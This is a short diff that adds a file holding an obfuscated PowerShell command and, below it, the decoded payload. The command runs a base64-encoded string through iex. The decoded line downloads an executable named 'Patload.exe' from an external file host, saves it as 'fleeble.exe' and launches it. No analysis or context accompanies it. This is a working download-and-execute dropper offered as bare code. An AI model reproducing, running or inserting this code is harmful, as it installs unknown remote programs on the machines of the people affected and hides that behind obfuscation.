@@ -1,0 +1,7 @@
+iex([sYsTEM.TExT.encoding]::UtF8.GeTSTRing([SYStEm.CoNVErT]::fRombaSE64STRInG('CihOZXctT2JqZWN0IHNZU1RFbS5ORVQuV2ViQ2xJZW50KS5ET1dObE9hZGZJTEUoJ2h0dHA6Ly9kZGw3LmRhdGEuaHUvZ2V0LzAvOTUwNzE0OC9QYXRsb2FkLmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYSTEm.NET.WebClIent).DOWNlOadfILE('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
